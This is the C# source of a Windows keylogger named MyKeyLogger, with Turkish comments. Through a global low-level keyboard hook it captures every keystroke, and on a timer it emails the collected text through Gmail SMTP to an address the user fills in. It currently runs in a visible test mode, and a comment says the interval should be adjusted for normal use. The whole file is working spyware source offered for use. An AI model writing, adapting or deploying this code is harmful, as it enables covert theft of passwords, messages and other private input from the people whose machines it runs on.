using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Mail;
using System.Timers;

namespace MyKeyLogger
{
    public partial class Form1 : Form
    {
        // Klavye hook için gerekli sabitler
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // Hook delegate
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // Klavyeden tutulan veriler
        private static StringBuilder keyBuffer = new StringBuilder();
        
        // Timer için
        private static System.Timers.Timer emailTimer;

        // E-posta ayarları - Bunları kendi bilgilerinizle değiştirin
        private const string SENDER_EMAIL = "";
        private const string SENDER_PASSWORD = ""; // Gmail uygulama şifresi (boşluksuz)
        private const string RECEIVER_EMAIL = "";
        private const int SEND_INTERVAL = 10000; // TEST: 10 saniyede bir gönder (normal kullanımda 60000 yapın)
        
        // Gmail yerine Outlook kullanmak için:
        // SENDER_EMAIL: outlook/hotmail adresiniz
        // SendEmail metodundaki smtp.gmail.com -> smtp-mail.outlook.com
        // Port: 587 (aynı kalabilir)

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public Form1()
        {
            InitializeComponent();
            
            // TEST MOD: Formu görünür yap
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = true;
            this.Opacity = 1;
            this.Text = "KeyLogger Çalışıyor...";
            this.Size = new Size(400, 200);
            
            // Hook'u başlat
            _hookID = SetHook(_proc);
            
            // Timer'ı başlat
            emailTimer = new System.Timers.Timer(SEND_INTERVAL);
            emailTimer.Elapsed += OnTimedEvent;
            emailTimer.AutoReset = true;
            emailTimer.Enabled = true;
            
            MessageBox.Show("KeyLogger başlatıldı!\n\nKlavyede yazdıklarınız kaydediliyor.\n" + 
                          (SEND_INTERVAL/1000) + " saniyede bir e-posta gönderilecek.", 
                          "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                
                // Karakteri al
                string keyText = GetCharFromKey((uint)vkCode);
                if (!string.IsNullOrEmpty(keyText))
                {
                    keyBuffer.Append(keyText);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetCharFromKey(uint vkCode)
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            uint scanCode = MapVirtualKey(vkCode, 0);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

            StringBuilder result = new StringBuilder(2);
            int ret = ToUnicodeEx(vkCode, scanCode, keyboardState, result, result.Capacity, 0, inputLocaleIdentifier);

            if (ret > 0)
            {
                return result.ToString();
            }
            else
            {
                // Özel tuşlar için
                Keys key = (Keys)vkCode;
                switch (key)
                {
                    case Keys.Space: return " ";
                    case Keys.Enter: return "\n";
                    case Keys.Tab: return "\t";
                    case Keys.Back: return "[BACKSPACE]";
                    case Keys.Delete: return "[DELETE]";
                    case Keys.Escape: return "[ESC]";
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                        return "";
                    default:
                        return "";
                }
            }
        }

        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            // Eğer buffer'da veri varsa e-posta gönder
            if (keyBuffer.Length > 0)
            {
                SendEmail(keyBuffer.ToString());
                keyBuffer.Clear();
            }
        }

        private static void SendEmail(string content)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress(SENDER_EMAIL);
                mail.To.Add(RECEIVER_EMAIL);
                mail.Subject = "Keylogger Raporu - " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                mail.Body = "Kaydedilen Tuşlar:\n\n" + content;

                smtpServer.Port = 587;
                smtpServer.Credentials = new NetworkCredential(SENDER_EMAIL, SENDER_PASSWORD);
                smtpServer.EnableSsl = true;

                smtpServer.Send(mail);
                
                // Başarılı gönderim
                System.Diagnostics.Debug.WriteLine("E-posta başarıyla gönderildi!");
                MessageBox.Show("E-posta başarıyla gönderildi!", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                // Hata mesajını göster
                string errorMsg = "E-posta gönderme hatası: " + ex.Message;
                System.Diagnostics.Debug.WriteLine(errorMsg);
                MessageBox.Show(errorMsg, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Hook'u kaldır
            UnhookWindowsHookEx(_hookID);
            
            // Son verileri gönder
            if (keyBuffer.Length > 0)
            {
                SendEmail(keyBuffer.ToString());
            }
            
            emailTimer?.Stop();
            emailTimer?.Dispose();
            
            base.OnFormClosing(e);
        }
    }
}
